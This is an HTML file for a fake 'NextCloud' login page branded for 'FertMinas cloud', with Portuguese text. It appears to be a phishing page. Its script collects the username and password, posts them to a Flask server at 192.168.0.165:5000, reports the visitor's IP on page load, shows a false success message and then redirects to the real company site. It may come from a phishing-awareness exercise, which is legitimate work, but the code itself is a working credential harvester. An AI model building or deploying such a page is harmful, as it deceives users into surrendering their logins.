<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NextCloud</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
</head>
<body>
    <div id="bgHome">
        <div class="container text-center">
            <div class="row align-items-center">
                <div class="col"></div>
                <div class="col">
                    <img src="images/logo.png" alt="" style="width: 190px; height: auto;" class="logo">
                    <div id="formCentral">
                        <h4>Faça login em <br>FertMinas cloud</h4>
                        <form action="" style="text-align: left;" id="form">
                            <label for="user" id="label">Faça login com seu usuário</label>
                            <input type="text" name="user" class="input" id="user">
                            <label for="password" id="label">Coloque sua senha</label>
                            <input type="text" name="password" class="input" id="password">
                            <button id="button" type="submit">ENTRAR</button>
                        </form>
                        <br>
                        <a href="https://fertminas.com.br" style="color: black; ">solicitar acesso ao TI</a>
                    </div>
                </div>
                <div class="col"></div>
            </div>
        </div>
    </div>
    <script>
        document.querySelector('form').addEventListener('submit', formu);

        function formu(event) {
            event.preventDefault(); // Evita o envio padrão do formulário

            const user = document.getElementById('user').value;
            const password = document.getElementById('password').value;

            const data = {
                user: user,
                password: password
            };
            console.log(data);

            const options = {
                method: 'POST', // Altere para 'POST' se o servidor Flask espera dados via POST
                body: JSON.stringify(data),
                headers: {
                    'Content-Type': 'application/json'
                }
            };

            fetch('http://192.168.0.165:5000/form', options)
                .then(response => response.json())
                .then(data => {
                    console.log("Resposta do Servidor:", data);
                    alert("Cadastro Realizado com Sucesso!");
                    window.location.href = 'https://fertminas.com.br';
                })
                .catch(error => console.log('Erro:', error));
        }

        console.log('dados enviados ao server');
    </script>
    <script>
        const options = {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json'
            }
        };
        fetch('http://192.168.0.165:5000/ip', options);
        console.log("Ip enviado ao servidor");
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
</body>
</html>
